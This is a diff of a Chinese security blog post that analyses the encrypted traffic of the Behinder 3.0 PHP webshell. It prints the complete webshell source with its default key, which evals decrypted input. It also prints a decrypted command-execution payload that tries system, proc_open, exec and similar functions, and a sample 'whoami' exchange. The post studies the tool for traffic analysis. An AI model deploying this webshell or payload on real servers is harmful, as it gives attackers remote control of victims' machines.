@@ -145,15 +145,7 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color3">钓鱼</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color5">漏洞复现</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">JAVA</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -161,7 +153,15 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color3">钓鱼</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color4">反汇编</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">JAVA</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -181,6 +181,10 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color5">主机漏洞</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color3">注入</a>
     </li>
     
@@ -189,15 +193,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">主机漏洞</a>
+        <a class="color3">协议</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">甲方安全</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">协议</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -209,14 +209,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">webshell</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">流量分析</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color2">Python</a>
     </li>
     
@@ -225,11 +217,19 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">CobaltStrike</a>
+        <a class="color4">webshell</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">流量分析</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">CS插件</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">CobaltStrike</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -249,11 +249,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">bypass</a>
+        <a class="color4">域渗透</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">域渗透</a>
+        <a class="color2">bypass</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -293,11 +293,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">应急响应</a>
+        <a class="color3">思考</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">思考</a>
+        <a class="color5">应急响应</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -1206,7 +1206,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2021-06-23 16:01:48'>2021-06-23 15:27</time>
+        创建时间:<time class="date" title='更新时间: 2021-06-23 16:45:26'>2021-06-23 15:27</time>
         
     </div>
     <div class="article-meta">
@@ -1228,7 +1228,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#流量解密"><span class="toc-text">流量解密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#流量特征"><span class="toc-text">流量特征</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#流量解密"><span class="toc-text">流量解密</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1250,11 +1250,17 @@
 <p>为了方便测试，php需开启openssl插件。<br><img src="/2021/06/23/behinder3-analysis-php/openssl.png" alt></p>
 <p>Behinder内置Webshell，在server目录下</p>
 <p>shell.php内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="line">	$_SESSION[&apos;k&apos;]=$key;</span><br><span class="line">	session_write_close();</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&apos;|&apos;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>和Behinder2.0相比，可以发现加密方式并没有改变，若开启了openssl，则会采用AES128-&gt;base64进行解密，若未开启openssl，则会使用base64-&gt;异或进行解密，不过加密的秘钥变成了连接密码md5后的前16位</p>
+<p>和Behinder2.0相比，可以发现加密方式并没有改变，若开启了openssl，则会采用AES128-&gt;base64进行解密，若未开启openssl，则会使用base64-&gt;异或进行解密。</p>
 <p>将/server/shell.php放置在phpstudy网站目录中，使用Behinder3.0进行连接，默认密码为<strong>rebeyond</strong></p>
 <p>成功连接<br><img src="/2021/06/23/behinder3-analysis-php/success.png" alt></p>
-<h1 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h1><p>这里为了直观我将流量代理至burp进行分析</p>
-<h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1>
+<h1 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h1><p>这里为了直观我将流量代理至burp进行分析，打开webshell之后，bp一共抓到了两个数据包第一个数据包是用来判断连通性，第二个数据包收集了一些系统的基本信息，同Behinder2.0相比，3.0取消了两次获取秘钥的操作，直接将秘钥规定成了md5(“pass”)[0:16]。<br><img src="/2021/06/23/behinder3-analysis-php/2.png" alt></p>
+<p>AES解密：<a href="http://tools.bugscaner.com/cryptoaes/" target="_blank" rel="noopener">http://tools.bugscaner.com/cryptoaes/</a><br>Base64解密：<a href="https://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">https://tool.oschina.net/encrypt?type=3</a></p>
+<p>这里在Behinder中通过cmd查询当前用户</p>
+<p>POST数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure></p>
+<p>解密后得到php代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd,$path)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&apos;max_execution_time&apos;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&apos;disable_functions&apos;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&apos;trim&apos;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &apos;is_callable&apos;;</span><br><span class="line">    $Bvce = &apos;in_array&apos;;</span><br><span class="line">    if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;r&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &apos;r&apos;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&apos;k&apos;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&apos;k&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$cmd=&quot;Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJndob2FtaQ==&quot;;$cmd=base64_decode($cmd);$path=&quot;QzovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXLw==&quot;;$path=base64_decode($path);</span><br><span class="line">main($cmd,$path);</span><br></pre></td></tr></table></figure></p>
+<p>其中cmdbase64再次解密后为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d &quot;C:\phpStudy\PHPTutorial\WWW\&quot;&amp;whoami</span><br></pre></td></tr></table></figure></p>
+<p>可以看见执行了我们想要的系统命令，再来看返回包的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始返回数据：</span><br><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6s/lQ/FSv4i/f1oXtFnU8jMC7rtIEWFK+lwkXIolWSPw==</span><br><span class="line">AES解密后数据：</span><br><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;c3dhZzctcGNcc3dhZzcNCg==&quot;&#125;</span><br><span class="line">base64解密后的msg：</span><br><span class="line">swag7-pc\swag7</span><br></pre></td></tr></table></figure></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
     </div>
@@ -1267,7 +1273,7 @@
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
     <p><span class="copy-title">发布时间:</span>2021-06-23, 15:27:30</p>
-    <p><span class="copy-title">最后更新:</span>2021-06-23, 16:01:48</p>
+    <p><span class="copy-title">最后更新:</span>2021-06-23, 16:45:26</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/06/23/behinder3-analysis-php/" title="behinder2.0流量分析(PHP)">http://sherlocz.github.io/2021/06/23/behinder3-analysis-php/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1312,7 +1318,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#钓鱼','#漏洞复现','#JAVA','#爬虫','#反汇编','#内网渗透','#汇编','#实战','#提权','#注入','#免杀','#主机漏洞','#甲方安全','#协议','#代码审计','#权限维持','#webshell','#流量分析','#Python','#工具','#CobaltStrike','#CS插件','#信息收集','#exchange','#环境搭建','#Mimikatz','#bypass','#域渗透','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#应急响应','#思考','#译文',],
+            'data': ['#漏洞复现','#爬虫','#钓鱼','#反汇编','#JAVA','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#注入','#免杀','#协议','#甲方安全','#代码审计','#权限维持','#Python','#工具','#webshell','#流量分析','#CS插件','#CobaltStrike','#信息收集','#exchange','#环境搭建','#Mimikatz','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#msf','#disable_function','#逆向','#思考','#应急响应','#译文',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
